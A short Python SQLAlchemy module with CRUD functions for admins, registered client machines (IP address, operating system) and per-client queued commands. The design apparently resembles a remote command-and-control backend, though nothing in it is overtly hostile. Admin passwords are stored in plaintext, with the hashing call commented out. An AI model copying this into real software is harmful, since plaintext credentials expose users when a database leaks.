from sqlalchemy.orm import Session
import models, schemas
from werkzeug.security import generate_password_hash

def get_admins(db: Session):
    return db.query(models.Admin).all()

def create_admin(db: Session, admin: models.Admin):
    #hashed_password = generate_password_hash(admin.hashed_password)
    db_admin = models.Admin(username=admin.username, password=admin.password)
    db.add(db_admin)
    db.commit()
    db.refresh(db_admin)
    return db_admin


def create_client(db: Session, client: schemas.ClientCreate):
    db_client = models.Client(client_id=client.client_id, ip_address=client.ip_address, operating_system=client.operating_system)
    db.add(db_client)
    db.commit()
    db.refresh(db_client)
    return db_client
    

def get_clients(db: Session, skip: int = 0, limit: int = 100):
    return db.query(models.Client).offset(skip).limit(limit).all()

def create_command(db: Session, command: schemas.CommandCreate):
    db_command = models.Command(client_id=command.client_id, command=command.command, executed=False)
    db.add(db_command)
    db.commit()
    db.refresh(db_command)
    return db_command

def get_commands(db: Session, skip: int = 0, limit: int = 100):
    return db.query(models.Command).offset(skip).limit(limit).all()


def get_commands_by_client_id(db: Session, client_id: int, skip: int = 0, limit: int = 100):
    return db.query(models.Command).filter(models.Command.client_id == client_id).offset(skip).limit(limit).all()

